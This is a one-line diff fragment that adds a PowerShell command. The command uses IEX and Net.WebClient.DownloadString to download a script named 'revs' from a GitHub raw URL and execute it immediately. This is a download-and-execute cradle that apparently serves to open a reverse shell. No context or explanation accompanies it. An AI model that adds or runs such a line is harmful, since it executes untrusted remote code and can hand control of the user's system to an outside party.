@@ -1,0 +1,1 @@
+powershell IEX "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/AIMadeScripts/testingcmd/main/revs')"
